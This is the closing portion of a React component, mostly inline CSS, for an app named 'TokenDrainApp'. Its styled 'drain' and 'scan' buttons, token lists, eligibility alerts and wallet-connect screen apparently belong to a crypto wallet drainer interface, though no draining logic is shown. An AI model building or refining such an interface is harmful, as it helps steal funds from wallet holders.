          color: #3b82f6;
          padding: 4px 8px;
          background: rgba(59, 130, 246, 0.1);
          border-radius: 6px;
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 16px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          transition: background 0.3s;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 25px;
          display: flex;
          align-items: center;
          gap: 20px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
          border-color: #3b82f6;
        }
        
        .status-card.not-eligible {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 36px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: rgba(255, 255, 255, 0.8);
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 8px;
        }
        
        .status-message {
          font-size: 20px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Controls */
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 18px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #16a34a, #22c55e);
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: linear-gradient(135deg, #15803d, #16a34a);
          transform: translateY(-2px);
        }
        
        /* Eligibility Alert */
        .eligibility-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
        }
        
        .alert-icon {
          font-size: 32px;
        }
        
        .alert-content {
          flex: 1;
        }
        
        .alert-title {
          font-size: 18px;
          font-weight: 600;
          color: white;
          margin-bottom: 5px;
        }
        
        .alert-message {
          color: rgba(255, 255, 255, 0.9);
          font-size: 14px;
        }
        
        /* Tokens Panel */
        .tokens-panel, .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 25px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 20px;
          color: white;
          font-weight: 600;
        }
        
        .total-value {
          font-size: 20px;
          font-weight: 700;
          color: #22c55e;
        }
        
        .tokens-list {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        
        .token-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 1px solid #333;
          transition: all 0.3s;
        }
        
        .token-item:hover {
          border-color: #444;
          transform: translateY(-1px);
        }
        
        .token-item.processing {
          border-color: #3b82f6;
          background: rgba(59, 130, 246, 0.05);
        }
        
        .token-icon {
          width: 40px;
          height: 40px;
          background: linear-gradient(135deg, #ef4444, #dc2626);
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 600;
          font-size: 14px;
        }
        
        .token-details {
          flex: 1;
        }
        
        .token-name {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 5px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 18px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          background: rgba(136, 136, 136, 0.1);
          padding: 2px 8px;
          border-radius: 4px;
        }
        
        .token-amount {
          color: #ddd;
          font-size: 16px;
        }
        
        .token-value {
          font-size: 18px;
          font-weight: 600;
          color: #22c55e;
          min-width: 100px;
          text-align: right;
        }
        
        .token-status-indicator {
          min-width: 100px;
        }
        
        .status-badge {
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }
        
        .status-badge.detected {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .status-badge.processing {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
        }
        
        /* Transactions */
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 1px solid #333;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-main {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 5px;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          color: white;
        }
        
        .tx-amount {
          color: #ddd;
          font-size: 14px;
        }
        
        .tx-network {
          color: #888;
          font-size: 12px;
          background: rgba(136, 136, 136, 0.1);
          padding: 2px 8px;
          border-radius: 4px;
        }
        
        .tx-hash {
          color: #3b82f6;
          font-size: 12px;
          font-family: monospace;
          margin-bottom: 5px;
        }
        
        .tx-message {
          color: #22c55e;
          font-size: 13px;
          font-weight: 500;
        }
        
        .tx-status {
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
          min-width: 100px;
          text-align: center;
        }
        
        .tx-status.processing {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 800px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 72px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 40px;
          font-size: 18px;
          line-height: 1.6;
          max-width: 600px;
          margin-left: auto;
          margin-right: auto;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .feature-cards {
          display: flex;
          justify-content: center;
          gap: 20px;
          margin-top: 40px;
        }
        
        .feature-card {
          background: #222;
          border-radius: 16px;
          padding: 30px 20px;
          text-align: center;
          border: 1px solid #333;
          flex: 1;
          max-width: 200px;
        }
        
        .feature-icon {
          font-size: 32px;
          margin-bottom: 15px;
        }
        
        .feature-title {
          font-size: 18px;
          font-weight: 600;
          color: white;
          margin-bottom: 8px;
        }
        
        .feature-desc {
          color: #888;
          font-size: 14px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 15px;
          flex-wrap: wrap;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #22c55e;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Progress Bar */
        .scan-progress {
          margin-top: 15px;
        }
        
        .progress-bar {
          height: 6px;
          background: #333;
          border-radius: 3px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #3b82f6, #22c55e);
          transition: width 0.3s;
        }
        
        .progress-text {
          font-size: 12px;
          color: #888;
          margin-top: 5px;
          text-align: right;
        }
        
        /* Mobile Styles */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          
          .connected-wallet {
            flex-direction: column;
            gap: 15px;
          }
          
          .stats-row {
            flex-direction: column;
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .feature-cards {
            flex-direction: column;
            align-items: center;
          }
          
          .feature-card {
            max-width: 100%;
          }
          
          .transaction-item,
          .token-item {
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
          }
          
          .token-value,
          .token-status-indicator {
            align-self: flex-start;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 8px;
          }
        }
        
        @media (max-width: 480px) {
          .app-container {
            padding: 10px;
          }
          
          .status-card {
            flex-direction: column;
            text-align: center;
            gap: 15px;
          }
          
          .custom-connect-btn {
            min-width: 100%;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
